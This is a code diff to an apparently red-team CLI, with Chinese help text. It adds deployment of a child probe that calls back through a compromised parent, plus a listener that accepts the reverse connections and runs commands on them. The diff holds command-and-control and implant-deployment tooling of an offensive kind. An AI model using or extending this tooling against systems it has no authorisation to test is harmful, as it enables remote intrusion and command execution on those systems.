@@ -204,12 +204,28 @@ def register(sub) -> None:
     pl.add_argument("--session", default=None)
     pl.add_argument("--json", action="store_true")
     pd = psub.add_parser("deploy", help="投放探针（默认干跑；写需 --allow-write）")
-    pd.add_argument("--session", required=True)
+    pd.add_argument("--session", default=None)
     pd.add_argument("--workspace", default="local-lab")
     pd.add_argument("--actor", default="cli")
     pd.add_argument("--role", choices=["admin", "lead", "tester", "auditor"], default="tester")
     pd.add_argument("--via", choices=["manifest", "rce", "sa-token", "kubectl"], default="manifest")
     pd.add_argument("--binary", default=None)
+    pd.add_argument("--reverse", metavar="PARENT_PROBE", default=None,
+                    help="经已回连/已连接的父探针投放回连子探针")
+    pd.add_argument("--child-id", default=None, help="回连子探针 id（默认随机）")
+    pd.add_argument("--reverse-host", "--host", dest="reverse_host", default=None,
+                    help="子探针回连地址（控制端可达地址）")
+    pd.add_argument("--reverse-port", "--port", dest="reverse_port", type=int, default=None,
+                    help="子探针回连端口（默认 9443）")
+    pd.add_argument("--transport", choices=["tls", "wss", "https"], default="tls",
+                    help="子探针加密传输（默认 tls）")
+    pd.add_argument("--pin", default=None, help="控制端服务器证书 SHA-256 pin")
+    pd.add_argument("--ca-file", default=None, help="控制端 CA 证书")
+    pd.add_argument("--sni", default=None, help="SNI（默认回连地址）")
+    pd.add_argument("--connect-timeout-ms", type=int, default=10_000)
+    pd.add_argument("--remote-dir", action="append", default=[],
+                    help="子探针上传目录（可重复；默认 /tmp 后回退 /dev/shm）")
+    pd.add_argument("--rpc-timeout", type=float, default=120.0)
     pd.add_argument("--namespace", default=None)
     pd.add_argument("--pod", default=None)
     pd.add_argument("--container", default=None)
@@ -309,6 +325,52 @@ def register(sub) -> None:
     cs.add_argument("--allow-cmd", action="append", default=[])
     cs.add_argument("--foreground", action="store_true")
     cs.add_argument("--timeout", type=float, default=30)
+    lr = csub.add_parser("listen", help="反向通道：监听并认证主动回连的探针（默认 0.0.0.0:9443）")
+    lr.add_argument("--bind", default="0.0.0.0")
+    lr.add_argument("--port", type=int, default=9443)
+    lr.add_argument("--transport", choices=["tls", "wss", "https"], default="tls",
+                    help="加密传输：tls（默认）/wss/https；无公开明文选项")
+    lr.add_argument("--lab-plaintext", action="store_true", help=argparse.SUPPRESS)
+    lr.add_argument("--tls-dir", default=None, help="CA/服务器证书目录（默认工作区 reverse/tls）")
+    lr.add_argument("--tls-cert", default=None)
+    lr.add_argument("--tls-key", default=None)
+    lr.add_argument("--tls-ca", default=None)
+    lr.add_argument("--sni", default=None)
+    lr.add_argument("--tls-host", action="append", default=[],
+                    help="证书 SAN（可重复；默认 localhost/127.0.0.1/::1）")
+    lr.add_argument("--tls-days", type=int, default=3650)
+    lr.add_argument("--wss-path", default="/ws")
+    lr.add_argument("--poll-path", default="/v1/probe/poll")
+    lr.add_argument("--result-path", default="/v1/probe/result")
+    lr.add_argument("--user-agent", default="")
+    lr.add_argument("--ping-interval", type=float, default=15.0)
+    lr.add_argument("--idle-timeout", type=float, default=60.0)
+    lr.add_argument("--max-pending", type=int, default=64)
+    lr.add_argument("--token-file", required=True, help="探针 HMAC token 文件")
+    lr.add_argument("--workspace", default="local-lab")
+    lr.add_argument("--once", action="store_true", help="接一个探针、执行动作后退出")
+    lr.add_argument("--exec", dest="exec_action", default=None,
+                    metavar="OP", help="once 模式动作：collect|ping|beacon|exec|<op>")
+    lr.add_argument("--op", default=None, help="直接执行协议 op（优先于 --exec）")
+    lr.add_argument("--args", dest="args_json", default="{}", help="op 参数 JSON")
+    lr.add_argument("--argv", nargs=argparse.REMAINDER, default=[],
+                    help="--exec exec 的 argv（放在 -- 之后）")
+    lr.add_argument("--timeout", type=float, default=30.0)
+    lr.add_argument("--duration", type=float, default=0.0,
+                    help="长驻模式运行秒数（0=直到 Ctrl+C）")
+    lr.add_argument("--max-probes", type=int, default=0,
+                    help="达到 N 个在线探针后退出长驻模式（0=不限）")
+    lr.add_argument("--no-control", action="store_true",
+                    help="不启动 127.0.0.1 本地控制口")
+    lr.add_argument("--json", action="store_true")
+    ce = csub.add_parser("exec", help="经本地控制口对已回连探针执行操作")
+    ce.add_argument("--workspace", default="local-lab")
+    ce.add_argument("--probe-id", default=None)
+    ce.add_argument("--op", default="collect", help="collect|ping|request op")
+    ce.add_argument("--args", dest="args_json", default="{}")
+    ce.add_argument("--argv", nargs=argparse.REMAINDER, default=[])
+    ce.add_argument("--timeout", type=float, default=30.0)
+    ce.add_argument("--json", action="store_true")
     st = csub.add_parser("status", help="通道状态")
     st.add_argument("--workspace", default="local-lab")
     st.add_argument("--json", action="store_true")
@@ -557,6 +619,12 @@ def _probe_cmd(args, home: Path) -> int:
 
 
 def _probe_deploy(args, home: Path, store: EvidenceStore, sess) -> int:
+    if getattr(args, "reverse", None):
+        return _probe_deploy_reverse(args, home, store, sess)
+    if sess is None:
+        print("inkblade probe deploy: --session is required (or use --reverse)",
+              file=sys.stderr)
+        return 2
     if args.via == "manifest":
         try:
             binary, sha, arch = load_probe_binary(args.binary, allow_non_elf=True)
@@ -658,6 +726,117 @@ def _probe_deploy(args, home: Path, store: EvidenceStore, sess) -> int:
     return 0
 
 
+def _probe_deploy_reverse(args, home: Path, store: EvidenceStore, sess) -> int:
+    """Upload a child probe through a parent and ask it to dial back."""
+    from .. import reverse
+    from ..core.probes import ProbeRegistry
+
+    if sess is None and not args.probe_command:
+        print("inkblade probe deploy --reverse: --session or --probe-command is required",
+              file=sys.stderr)
+        return 2
+    host = args.reverse_host or os.environ.get("INKBLADE_REVERSE_HOST", "")
+    if not host:
+        print("inkblade probe deploy --reverse: --reverse-host HOST is required",
+              file=sys.stderr)
+        return 2
+    port = args.reverse_port or int(os.environ.get("INKBLADE_REVERSE_PORT", "9443"))
+    child_id = args.child_id or f"child-{os.urandom(4).hex()}"
+    remote_dirs = args.remote_dir or list(reverse.DEFAULT_REMOTE_DIRS)
+    transport = args.transport or "tls"
+    ca_file = args.ca_file or os.environ.get("INKBLADE_REVERSE_CA", "")
+    pin = args.pin or os.environ.get("INKBLADE_REVERSE_PIN", "")
+    if not pin and ca_file:
+        sidecar = Path(ca_file).parent / "server.sha256"
+        if sidecar.is_file():
+            pin = sidecar.read_text(encoding="utf-8").strip()
+    if not pin:
+        fallback = reverse.reverse_paths(home, args.workspace)["tls"] / "server.sha256"
+        if fallback.is_file():
+            pin = fallback.read_text(encoding="utf-8").strip()
+    if not ca_file:
+        ca_candidate = reverse.reverse_paths(home, args.workspace)["tls"] / "ca.pem"
+        if ca_candidate.is_file():
+            ca_file = str(ca_candidate)
+    dry = bool(args.dry_run or not args.allow_write)
+    try:
+        binary, sha, arch = load_probe_binary(
+            args.binary, allow_non_elf=bool(dry or args.probe_command)
+        )
+    except ProbeDeployError as exc:
+        print(f"inkblade probe deploy --reverse: {exc}", file=sys.stderr)
+        return 2
+    plan = {
+        "parent_id": args.reverse,
+        "probe_id": child_id,
+        "arch": arch,
+        "sha256": sha,
+        "transport": transport,
+        "reverse": {"host": host, "port": port,
+                    "transport": transport,
+                    "sni": args.sni or host,
+                    "ca_file": ca_file,
+                    "pin": pin,
+                    "connect_timeout_ms": args.connect_timeout_ms},
+        "remote_dirs": remote_dirs,
+        "dry_run": dry,
+    }
+    if dry:
+        plan["plan"] = (
+            "upload the binary to the first writable remote dir, then spawn "
+            f"{child_id} with reverse --transport {transport} --host {host} "
+            f"--port {port} --pin <sha256>"
+        )
+        _print_json(plan)
+        return 0
+    if transport in reverse.TRANSPORTS and (not pin or not ca_file):
+        print("inkblade probe deploy --reverse: encrypted child needs --pin and --ca-file",
+              file=sys.stderr)
+        return 2
+    try:
+        _ensure_allow_write(args, store)
+        connection = _connect(args, sess, read_only=False)
+    except (ExecutionLocked, ChannelError, OSError, ValueError) as exc:
+        print(f"inkblade probe deploy --reverse: {exc}", file=sys.stderr)
+        return 91 if isinstance(exc, ExecutionLocked) else 2
+    try:
+        result = reverse.deploy_reverse_child(
+            connection, binary, child_id=child_id, host=host, port=port,
+            transport=transport, sni=args.sni or host,
+            ca_file=ca_file, pin=pin,
+            connect_timeout_ms=args.connect_timeout_ms,
+            remote_dirs=remote_dirs, timeout=float(args.rpc_timeout),
+        )
+    except reverse.ReverseChannelError as exc:
+        print(f"inkblade probe deploy --reverse: {exc}", file=sys.stderr)
+        if isinstance(exc.data, dict) and exc.data.get("attempts"):
+            for attempt in exc.data["attempts"]:
+                print(f"  {attempt.get('path')}: {attempt.get('error')}",
+                      file=sys.stderr)
+        return 3 if exc.code == "read_only_rootfs" else 2
+    except (ChannelError, OSError, ValueError) as exc:
+        print(f"inkblade probe deploy --reverse: {exc}", file=sys.stderr)
+        return 2
+    finally:
+        try:
+            connection.close()
+        except Exception:
+            pass
+    try:
+        ProbeRegistry(store).register(
+            result["probe_id"], parent_id=args.reverse, status="connecting",
+            read_only=False, meta={
+                "transport": "reverse",
+                "remote_path": result.get("uploaded_path", ""),
+                "reverse": result.get("reverse"),
+            },
+        )
+    except Exception:
+        pass
+    _print_json({**plan, **result, "dry_run": False})
+    return 0
+
+
 def _parse_forward(value: str) -> Forward:
     parts = value.split(":")
     if len(parts) != 3:
@@ -668,6 +847,14 @@ def _parse_forward(value: str) -> Forward:
 def _channel_cmd(args, home: Path) -> int:
     if args.channel_cmd == "serve":
         return _channel_serve(args)
+    if args.channel_cmd == "listen":
+        from .. import reverse
+
+        return reverse.cli_listen(args, home)
+    if args.channel_cmd == "exec":
+        from .. import reverse
+
+        return reverse.cli_control_exec(args, home)
     store = _store(home, args.workspace)
     state = _state_path(home, args.workspace)
     if args.channel_cmd == "status":
